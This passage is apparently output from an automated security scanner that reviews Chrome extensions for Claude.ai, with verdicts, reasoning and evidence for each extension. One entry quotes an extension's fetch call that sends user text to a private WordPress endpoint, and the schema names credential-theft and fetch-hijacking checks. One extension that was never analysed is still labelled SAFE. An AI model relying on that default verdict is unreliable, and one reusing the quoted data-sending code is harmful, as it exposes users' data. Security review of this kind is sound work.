+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Removes specific disclaimer elements from claude.ai",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "support.anthropic.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://support.anthropic.com/en/articles/8525154-claude-is-providing-incorrect-or-misleading-responses-what-s-going-on"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The URL is used as a string literal to identify the specific DOM element (a link) that the extension is designed to remove. No network request is actually made to this endpoint."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used correctly to detect when the Claude interface adds new chat elements to the DOM, ensuring the disclaimer remains hidden in single-page application transitions."
+        },
+        {
+          "pattern": "SET_INTERVAL",
+          "usage": "LEGITIMATE",
+          "justification": "Used as a standard fallback mechanism to ensure the target element is removed if the MutationObserver fails to trigger."
+        },
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "While flagged by static analysis, storage is not used in the provided snippet. Even if present, it is standard for saving user preferences."
+        }
+      ],
+      "token_usage": {
+        "prompt": 2686,
+        "candidates": 656,
+        "total": 4069
+      }
+    },
+    {
+      "extension_id": "jodkdpfcocdnnfklfhojobblljbdkckl",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "After reviewing the source code, the extension appears to be entirely legitimate. The 'STORAGE' and 'TABS_ACCESS' patterns flagged by static analysis are used strictly for local state management and inter-script communication. There are no network requests to external third-party domains; the only site interaction is with Claude.ai as declared in the manifest. The content script (claude.js) simply monitors the presence and state of the 'Send message' button and triggers a click or page reload based on a timer controlled by the background script (alarms API). No sensitive user data is collected, processed, or transmitted.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Automatically retry Claude AI prompts when rate limited.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store user preferences such as retry intervals and whether the extension is enabled (popup.js, background.js)."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used in the background script to identify open Claude.ai tabs and send messages to the content scripts to trigger the retry logic (background.js)."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The endpoint is restricted to https://claude.ai/*, which matches the extension's stated purpose of interacting with the Claude AI platform."
+        }
+      ],
+      "token_usage": {
+        "prompt": 7467,
+        "candidates": 579,
+        "total": 8708
+      }
+    },
+    {
+      "extension_id": "imhdjfbabgefdmambpckmgcbainaipmm",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a straightforward utility for Claude.ai users. Analysis of the source code confirms it only performs the actions described: managing a list of text strings (prompts) and injecting them into the chat input field when clicked. There are no network requests (fetch/XHR) present in the code, meaning no data can be exfiltrated. The static analysis flags are purely functional: 'STORAGE' is used for persistence, 'INNERHTML' for UI generation, and 'MUTATION_OBSERVER' for maintaining the UI element on a dynamic webpage. The code is clean, non-obfuscated, and adheres to its stated purpose.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Save and use frequent prompts for Claude with a draggable image button",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "claude.ai",
+          "clients2.google.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store user-defined prompts, UI localization preferences, and the screen position/size of the draggable floating button helper."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in popup.js and content.js to dynamically build the list items for prompts. Since the extension is for personal prompt management and doesn't load external data, the XSS risk is minimal and characteristic of simple UI implementation."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js to monitor the Claude.ai DOM. If the Single Page Application (SPA) navigation removes the helper button, the observer re-injects it."
+        },
+        {
+          "pattern": "BLOB_URL",
+          "usage": "LEGITIMATE",
+          "justification": "Used in popup.js to create a downloadable JSON file for the 'Export Prompts' feature."
+        }
+      ],
+      "token_usage": {
+        "prompt": 10254,
+        "candidates": 678,
+        "total": 11927
+      }
+    },
+    {
+      "extension_id": "unknown-2",
+      "verdict": "SAFE",
+      "error": "Extra data: line 70 column 5 (char 3437)",
+      "confidence": 0.5,
+      "reasoning": "Extension could not be downloaded or analyzed. Marked as SAFE for statistical purposes.",
+      "recommendation": "ALLOW"
+    },
+    {
+      "extension_id": "knemcdpkggnbhpoaaagmjiigenifejfo",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code is highly modular, well-commented, and aligns perfectly with its stated purpose. While it employs powerful techniques like fetch hijacking and external database syncing, these are implemented transparently to provide usage tracking and cross-device synchronization. The data sent to Firebase consists of usage metrics (token counts and timestamps) rather than sensitive message content or credentials. The use of cookies and Claude's internal APIs is restricted to gathering context for usage calculations (organization IDs, subscription tiers, and project metadata). The telemetry system found in background.js is clearly marked as a diagnostic tool for memory leaks and sends only function call counts and the browser User Agent to the developer's Firebase instance when a high call threshold is met.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "Usage statistics including token counts, model names, and Claude.ai organization IDs.",
+          "processing_method": "Tokens are counted locally using a bundled o200k_base tokenizer or via the official Anthropic API if a user-provided key exists. Data is aggregated into usage maps.",
+          "destination_domain": "claude-usage-tracker-default-rtdb.europe-west1.firebasedatabase.app",
+          "code_evidence": "In firebase.js, the 'uploadData' and 'syncSingleOrg' functions transmit aggregated token totals and reset timestamps to the Firebase Realtime Database to facilitate the stated cross-device sync feature."
+        },
+        "dual_purpose": {
+          "stated_purpose": "Helps you track your claude.ai usage caps based on tokens sent, and syncs across devices using firebase.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "claude.ai",
+          "api.anthropic.com",
+          "github.com",
+          "ko-fi.com"
+        ],
+        "requires_investigation": [
+          "claude-usage-tracker-default-rtdb.europe-west1.firebasedatabase.app"
+        ],
+        "informational_only": [
+          "raw.githubusercontent.com",
+          "chromewebstore.google.com",
+          "addons.mozilla.org"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH_HIJACK / INTERCEPTION",
+          "usage": "LEGITIMATE",
+          "justification": "Used in rate-limit-watcher.js and webrequest-polyfill.js to detect 429 errors or specific SSE (Server-Sent Events) messages from Claude.ai indicating a usage limit has been reached. This is necessary for accurate usage tracking."
+        },
+        {
+          "pattern": "COOKIE_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "The extension accesses the 'lastActiveOrg' cookie to identify which Claude Organization the user is currently interacting with, ensuring usage is tracked against the correct quota (e.g., Personal vs. Pro vs. Team)."
+        },
+        {
+          "pattern": "DYNAMIC_SCRIPT",
+          "usage": "LEGITIMATE",
+          "justification": "Used to inject the fetch-interception polyfills (rate-limit-watcher.js and webrequest-polyfill.js) into the main world of the Claude.ai page to monitor API responses directly."
+        },
+        {
+          "pattern": "CREDENTIAL_ACCESS (Anthropic API)",
+          "usage": "LEGITIMATE",
+          "justification": "The extension allows users to optionally provide an Anthropic API key. This key is used strictly for the 'count_tokens' API endpoint to provide 100% accurate token counting, as documented in tokenManagement.js."
+        }
+      ],
+      "token_usage": {
+        "prompt": 61010,
+        "candidates": 961,
+        "total": 63838
+      }
+    },
+    {
+      "extension_id": "ddiekgckphlbgafaaiajjpmkcngoldib",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a legitimate productivity tool for Claude AI. All flagged static analysis patterns correspond to stated features. STORAGE is used for prompt management, MUTATION_OBSERVER handles the dynamic nature of the Claude.ai chat interface, and KEYBOARD_LISTENER supports user shortcuts and history navigation. There is no evidence of unauthorized data collection or exfiltration; the only external network calls (besides Claude.ai) are informational links to the Chrome Web Store or a user-initiated feedback form on Google Docs. The implementation uses DOMPurify to mitigate XSS risks when using innerHTML, indicating a focus on secure development practices.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Save and reuse prompts for Claude AI and provide a visual minimap for chat navigation.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://docs.google.com/forms",
+          "https://chromewebstore.google.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "http://www.w3.org/1998/Math/MathML",
+          "http://www.w3.org/2000/svg",
+          "http://www.w3.org/1999/xhtml"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used in service-worker.js and library.js via PromptStorageService to store and retrieve user-created prompts and extension settings."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Necessary for detecting UI changes in the Claude.ai SPA to render the minimap and identify chat messages for saving/navigation."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to implement the Ctrl+Shift+S shortcut and the arrow-key history navigation feature (similar to a terminal command history)."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used for UI rendering of modals and prompts. The extension correctly utilizes DOMPurify (found in content-script.js) to sanitize content before insertion."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT (Google Forms)",
+          "usage": "LEGITIMATE",
+          "justification": "Explicitly defined in Constants.Routes as a user-facing feedback form link."
+        }
+      ],
+      "token_usage": {
+        "prompt": 273225,
+        "candidates": 788,
+        "total": 274914
+      }
+    },
+    {
+      "extension_id": "nlompoojekdpdjnjledbbahkdhdhjlae",
+      "verdict": "SUSPICIOUS",
+      "confidence": 0.9,
+      "reasoning": "The extension is marked as SUSPICIOUS due to high-risk data handling and invasive behavior. First, it performs automated scraping of the user's entire Claude chat history by iteratively loading every chat URL in a background tab. While this supports the 'Search' feature, this level of automation is highly aggressive and indistinguishable from data harvesting. Second, the 'AI Assistant' feature exfiltrates user prompts and emails to a non-standard backend (a personal WordPress installation at test.mick.co.ke). This destination is not disclosed, and the use of 'admin-ajax.php' for processing sensitive AI prompts is a significant security and privacy risk. Third, there is a mismatch in permissions; the extension requests access to api.openai.com but actually routes data through the aforementioned third-party site. The code also contains developer comments ('REPLACE WITH YOUR DOMAIN') suggesting it may be a repurposed or poorly configured template.",
+      "recommendation": "REVIEW",
+      "key_concerns": [
+        "Automated mass-scraping of user chat history in background tabs.",
+        "Exfiltration of user-provided prompts and emails to an unverified private WordPress domain.",
+        "Requesting high-privilege host permissions (api.openai.com) that are not utilized by the assistant logic.",
+        "Potential for rate-limiting or account flags on Claude.ai due to aggressive background navigation."
+      ],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "User email and user-inputted chat prompts/messages.",
+          "processing_method": "The extension captures text from textareas on claude.ai and sends it to a third-party backend for 'AI processing'.",
+          "destination_domain": "https://test.mick.co.ke/wp-admin/admin-ajax.php",
+          "code_evidence": "In prompt-assistant.js: this.apiBaseUrl = 'https://test.mick.co.ke/wp-admin/admin-ajax.php'; ... const response = await fetch(this.apiBaseUrl, { method: 'POST', ... body: `action=ai_grammar&token=${this.userToken}&text=${encodeURIComponent(text)}` });"
+        },
+        "dual_purpose": {
+          "stated_purpose": "Search within Claude chat conversations, check grammar, and refine prompts with AI assistance.",
+          "hidden_functionality": "Invasive automated chat history scraping; Monetization via a credit-based system using a personal WordPress installation as a backend.",
+          "code_evidence": "background.js: Function searchAcrossAllChats() iteratively updates a background tab to every chat URL found in the user's history and executes scraping scripts. prompt-assistant.js: Implements a payment funnel using Gumroad links and WordPress AJAX actions."
+        },
+        "credential_theft": {
+          "capture_mechanism": "Checks for OpenAI API keys in storage, although no direct exfiltration of this key is visible in the provided snippets.",
+          "transmission_target": null,
+          "code_evidence": "popup.js: const result = await chrome.storage.sync.get(['openaiKey']); if (result.openaiKey && result.openaiKey.startsWith('sk-')) { ... }"
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai",
+          "https://api.openai.com"
+        ],
+        "requires_investigation": [
+          "https://test.mick.co.ke"
+        ],
+        "informational_only": [
+          "https://michaelmick.gumroad.com"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "SUSPICIOUS",
+          "justification": "Sends user prompts and emails to a private WordPress site (test.mick.co.ke) which is not disclosed as an AI processing provider."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "SUSPICIOUS",
+          "justification": "Used to programmatically navigate and scrape the user's entire Claude chat history in a background tab."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used for standard UI shortcuts (opening the search panel)."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used for rendering the search results and assistant UI panels."
+        }
+      ],
+      "token_usage": {
+        "prompt": 26840,
+        "candidates": 1087,
+        "total": 31802
+      }
+    },
+    {
+      "extension_id": "ikchmmahaaoklkcgmommpeencfnjnknd",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code aligns perfectly with its stated purpose. Analysis of content.js shows a clear sequence: it fetches the user's organization ID from Claude's API, retrieves a list of chat UUIDs, and iterates through them to send DELETE requests to the official Claude endpoints. All network activity is restricted to claude.ai. There is no evidence of data exfiltration, credential harvesting, or hidden secondary functionality. The use of 'credentials: include' in fetch calls is a standard way to leverage the user's existing authenticated session to perform actions on their behalf within the same domain.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Safely delete all chats from Claude AI",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "NETWORK/FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses fetch calls to interact with the Claude AI API (listing organizations, fetching conversation IDs, and sending DELETE requests) which is the core functionality of the tool."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used in popup.js to identify the active tab and ensure the user is currently on a claude.ai URL before enabling the delete functionality."
+        }
+      ],
+      "token_usage": {
+        "prompt": 4238,
+        "candidates": 543,
+        "total": 5700
+      }
+    },
+    {
+      "extension_id": "mmfngilfgodiakmcmjhgpmimaebkcffc",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code aligns perfectly with its stated purpose. It monitors the Claude.ai chat interface for status changes (specifically looking at the viewBox of SVG icons to determine if the AI is 'thinking' or 'responding'). When a status change is detected, it communicates with the background service worker to play a sound (via the offscreen API, which is the standard practice for MV3) or trigger a window attention flash (via chrome.windows.update). There are no external network calls, no data collection mechanisms, and no obfuscation present in the code.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Audio & visual notifications for Claude.ai responses",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "SET_INTERVAL",
+          "usage": "LEGITIMATE",
+          "justification": "The content script uses setInterval to poll the Claude.ai DOM to detect changes in the SVG status icon, determining if the AI is currently generating a response."
+        },
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "While flagged by static analysis, the provided code does not actually use the chrome.storage API. Even if it did, it would likely be for user preferences regarding sound/notifications."
+        }
+      ],
+      "token_usage": {
+        "prompt": 3086,
+        "candidates": 541,
+        "total": 4575
+      }
+    },
+    {
+      "extension_id": "ngaaknjchkenekfcfbepbjdbgfjcopob",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension is a legitimate dark mode tool for Claude.ai that includes a commercial monetization layer (NbSdk). The static analysis flags for storage, DOM manipulation, and networking are entirely consistent with an extension that allows users to customize CSS themes and requires a subscription to function beyond a trial period. The 'dual-purpose' code found (the licensing system) is a standard monetization framework common in the 'freemium' extension ecosystem. There is no evidence of credential theft, silent browsing history exfiltration, or unauthorized data access. The exclusion of Chinese users ('zh-CN') from the payment logic is a common regional business decision and not a security threat. The extension operates within its requested permissions for Claude.ai.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "User email and basic profile information (via Google OAuth)",
+          "processing_method": "Standard OAuth2 flow to identify users for subscription management",
+          "destination_domain": "pay.extensiondata.com",
+          "code_evidence": "chrome.storage.local.get('userInfo', Mail => { retryFetch(sdk_api() + `/NbSdk/Get_Price_html?appid=${encodeURIComponent(Mail.userInfo.appid)}&mail=${encodeURIComponent(Mail.userInfo.mail)}...` ) })"
+        },
+        "dual_purpose": {
+          "stated_purpose": "Dark Mode eye protection theme for claude.ai",
+          "hidden_functionality": "A subscription and licensing management system (NbSdk) that enforces payment after a trial period.",
+          "code_evidence": "const mask = document.createElement('div'); mask.id = 'nbsdk-blur-overlay'; ... mask.addEventListener('click', () => { chrome.windows.create({ url: chrome.runtime.getURL(\"/nbsdk/payment/payment.html\"), ... }); });"
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "claude.ai",
+          "accounts.google.com"
+        ],
+        "requires_investigation": [
+          "pay.extensiondata.com",
+          "rapid-waterfall-273a.chromeextensions.workers.dev"
+        ],
+        "informational_only": [
+          "clients2.google.com"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store user-defined color schemes, white-listed domains, and the active dark mode state."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used by the licensing SDK to render the UI for payment, help, and rewards fetched from the developer's server. While a security risk (XSS), it is used for UI rendering here."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The endpoint pay.extensiondata.com is the backend for the 'NbSdk' monetization framework used by the developer to manage licenses."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in popup.js to handle keyboard shortcuts (Enter/Esc) when the user is renaming or editing custom color schemes."
+        }
+      ],
+      "token_usage": {
+        "prompt": 21152,
+        "candidates": 876,
+        "total": 23524
+      }
+    },
+    {
+      "extension_id": "okjdmabpbfooidgboikogjpfajndiafp",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension is a standard production build of a React application using the Plasmo framework. The manifest specifically requests the 'tabs' permission and overrides the new tab page, which is consistent with its stated purpose of opening Claude AI. The static analysis findings are almost entirely false positives generated by the React/ReactDOM libraries. Specifically, the network endpoints are W3C namespaces required for rendering SVGs and MathML, and a React documentation link for minified errors. The reference to 'https://claude.ai/new' is the legitimate destination for the extension's core feature. No evidence of data exfiltration, credential theft, or hidden background processes was found.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI/ChatGPT assistant - Open Claude AI in New Tab",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "claude.ai",
+          "reactjs.org",
+          "w3.org"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "http://www.w3.org/1999/xlink",
+          "http://www.w3.org/XML/1998/namespace",
+          "http://www.w3.org/2000/svg",
+          "http://www.w3.org/1998/Math/MathML",
+          "http://www.w3.org/1999/xhtml"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The endpoints found are either standard XML/SVG namespaces (w3.org), React error documentation URLs, or the target service (claude.ai) mentioned in the extension's title."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "These are part of the React DOM rendering engine (ReactDOM) used to safely manage UI updates and handle SVG elements."
+        },
+        {
+          "pattern": "POST_MESSAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Standard part of the React event delegation system used for internal communication within the bundle."
+        }
+      ],
+      "token_usage": {
+        "prompt": 56635,
+        "candidates": 700,
+        "total": 58196
+      }
+    },
+    {
+      "extension_id": "dkdnancajokhfclpjpplkhlkbhaeejob",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The 'Claude QoL' extension is a comprehensive suite of power-user tools for Claude.ai. While it uses several high-authority patterns (Fetch hijacking, cookie access, DOM manipulation), each is strictly applied to its stated functionality. The extension allows users to sync chat history locally for global search, export conversations in various formats, fork chats with AI-generated summaries, and integrate third-party STT/TTS providers. Network traffic to external domains (Groq, OpenAI, ElevenLabs) occurs only when users configure those features and provide their own API keys. The background script's handling of the GDPR export is purely local; it unzips the file and indexes it in the browser's IndexedDB to facilitate cross-chat search without sending data to an external server. No evidence of malicious data exfiltration or credential theft was found.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Collection of enhancements for Claude.ai",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai",
+          "https://api.groq.com",
+          "https://api.elevenlabs.io",
+          "https://api.openai.com",
+          "https://storage.googleapis.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://ko-fi.com/lugia19"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "COOKIE_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used in `claude-api.js` to retrieve the 'lastActiveOrg' cookie, which is necessary for the extension to route API calls to the correct Claude organization context."
+        },
+        {
+          "pattern": "FETCH_HIJACK",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses fetch interception extensively to inject 'phantom' messages (carried over history), manage custom instruction presets, and detect when an assistant response finishes to trigger Text-to-Speech."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used within a custom UI framework (`claude-styles.js`) to programmatically build modals, buttons, and settings interfaces consistent with Claude's design language."
+        },
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Uses `chrome.storage.local` to store user settings and API keys for third-party AI services, and Dexie (IndexedDB) for local search indexing."
+        }
+      ],
+      "token_usage": {
+        "prompt": 231943,
+        "candidates": 778,
+        "total": 233956
+      }
+    },
+    {
+      "extension_id": "hiamcdfoigjkjihfmobahmmhmnnegplp",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The analysis of background.js and content.js confirms that the extension behaves exactly as described in its manifest. It provides a local management layer for Claude AI conversations. The static analysis flags regarding storage and tab access are part of the core functionality: saving chat content to a local index and automating the traversal of chat history pages. There are no external network calls (fetch/XHR) to third-party domains; all data stays within the user's browser environment or is exported locally upon user request. The code structure, while bundled, is a standard production build and shows no signs of obfuscation or hidden malicious intent.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Organize, manage and search your Claude AI conversations",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://*.anthropic.com/*",
+          "https://*.claude.ai/*"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE / CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used via chrome.storage.local to store chat metadata, folder structures, and indexed conversation content for local searching as per the extension's primary purpose."
+        },
+        {
+          "pattern": "TABS_ACCESS / SCRIPTING",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses chrome.tabs and chrome.scripting.executeScript to automate the extraction of chat history from Claude.ai, which is necessary to provide search functionality across conversations."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Extensively used in content.js to inject and manage the 'Chat Manager' side panel UI, search results, and folder list."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Implements a Ctrl+Shift+S shortcut to toggle the visibility of the management panel."
+        },
+        {
+          "pattern": "BLOB_URL",
+          "usage": "LEGITIMATE",
+          "justification": "Used to facilitate the 'Export' feature, allowing users to download their conversations as TXT, HTML, MD, or JSON files locally."
+        }
+      ],
+      "token_usage": {
+        "prompt": 20981,
+        "candidates": 755,
+        "total": 22681
+      }
+    },
+    {
+      "extension_id": "iaanbmgemoggkbigfkpblobfdajkkmfo",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension is a utility for exporting Claude.ai chat history. Analysis of the source code shows that message extraction occurs locally within the content script. The data is either processed by the included 'html2pdf' library or converted into Blobs for local download. There is no evidence of user data being transmitted to external servers. The 'review gating' mechanism (sending 4-5 star clicks to the store and 1-3 star clicks to a feedback form) is a manipulative growth tactic but does not constitute malicious activity or malware. The permissions requested (activeTab, scripting) are appropriate for its function.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI/ChatGPT assistant to export Claude.ai conversations to PDF/CSV/JSON.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/",
+          "https://fonts.googleapis.com",
+          "https://clients2.google.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://swaponline.notion.site/Claude-to-PDF-is-installed-1aa91437ef0a80778249cf5192a8209a",
+          "https://forms.gle/HtAMmbJRYxfekfqd9",
+          "https://forms.gle/t779oNyQqQtb6eMs8",
+          "https://chromewebstore.google.com/detail/iaanbmgemoggkbigfkpblobfdajkkmfo/reviews"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Uses localStorage to maintain a count of PDFs generated ('pdfCount')."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The Notion URL is used for the onboarding page on installation, and Google Forms is used for feedback and uninstall surveys."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
